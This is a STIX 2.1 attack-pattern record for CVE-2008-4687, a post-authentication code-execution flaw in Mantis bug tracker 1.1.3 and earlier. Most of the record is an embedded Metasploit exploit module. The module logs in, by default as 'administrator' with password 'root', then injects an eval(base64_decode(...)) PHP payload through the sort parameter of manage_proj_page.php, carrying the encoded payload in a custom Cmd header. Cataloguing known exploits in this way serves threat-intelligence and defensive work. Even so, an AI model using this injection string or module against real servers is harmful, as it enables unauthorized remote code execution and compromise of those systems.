{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2af9793-6432-4af8-bd0b-ff9b824b1c6f",
    "created": "2024-08-14T17:08:29.351329Z",
    "modified": "2024-08-14T17:08:29.351334Z",
    "name": "Mantis manage_proj_page PHP Code Execution",
    "description": " Mantis v1.1.3 and earlier are vulnerable to a post-authentication Remote Code Execution vulnerability in the sort parameter of the manage_proj_page.php page. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mantisbt_manage_proj_page_rce.rb",
            "external_id": "mantisbt_manage_proj_page_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4687"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mantis manage_proj_page PHP Code Execution',\n      'Description'    => %q{\n        Mantis v1.1.3 and earlier are vulnerable to a post-authentication Remote\n        Code Execution vulnerability in the sort parameter of the\n        manage_proj_page.php page.\n      },\n      'Author'         => [\n        'EgiX',           # Exploit-DB Entry Author\n        'Lars Sorenson'   # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '6768'],\n          ['CVE', '2008-4687'],\n        ],\n       'Privileged' => false,\n       'Platform'   => ['php'],\n       'Arch'       => ARCH_PHP,\n       'Targets' =>\n          [\n            [ 'Mantis <= 1.1.3', { } ],\n          ],\n      'DisclosureDate' => '2008-10-16',\n      'DefaultTarget' => 0))\n     register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the Mantis installation', '/mantisbt/']),\n        OptString.new('USERNAME', [true, 'The username to log in as', 'administrator']),\n        OptString.new('PASSWORD', [true, 'The password to log in with', 'root']),\n      ])\n  end\n\n  def check\n    vprint_status('Checking Mantis version ...')\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, 'login_page.php'),\n      'method' => 'GET'\n    })\n\n    unless res\n      vprint_error('Connection to host failed!')\n      return CheckCode::Unknown\n    end\n\n    unless res.body =~ /Mantis ([0-9]+\\.[0-9]+\\.[0-9]+)/\n      vprint_error('Cannot determine Mantis version!')\n      return CheckCode::Unknown\n    end\n\n    version = Rex::Version.new(Regexp.last_match[1])\n\n    vprint_status(\"Mantis version #{version} detected\")\n\n    if res.code == 200 && version <= Rex::Version.new('1.1.3')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def login\n    vprint_status(\"Logging in as #{datastore['username']}:#{datastore['password']} ... \")\n    res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(target_uri.path, 'login_page.php'),\n    })\n    unless res\n      fail_with(Failure::Unreachable, 'Cannot access host to log in!')\n    end\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path, 'login.php'),\n      'method'    => 'POST',\n      'vars_post' => {\n        username: datastore['username'],\n        password: datastore['password'],\n      },\n      'cookie'=> \"PHPSESSID=#{res.get_cookies}\"\n    })\n    unless res\n      fail_with(Failure::Unknown, 'Cannot access host to log in!')\n    end\n\n    fail_with(Failure::Unreachable, 'Login failed!') unless res.code == 302\n    fail_with(Failure::NoAccess, 'Wrong credentials!') if res.redirection.to_s.include?('login_page.php')\n\n    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    res.get_cookies\n  end\n\n  def exploit\n    fail_with(Failure::NotVulnerable, 'Target is not vulnerable!') unless check == CheckCode::Appears\n\n    cookie = login\n    vprint_status('Sending payload ...')\n    payload_b64 = Rex::Text.encode_base64(payload.encoded)\n    data = {\n      'sort' => \"']);}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die();#\",\n    }\n    send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path, 'manage_proj_page.php'),\n      'method'    => 'POST',\n      'vars_post' => data,\n      'headers' => {\n        Connection: 'close',\n        Cookie: cookie.to_s,\n        Cmd: payload_b64\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-16",
    "x_mitre_platforms": [
        "['php']"
    ]
}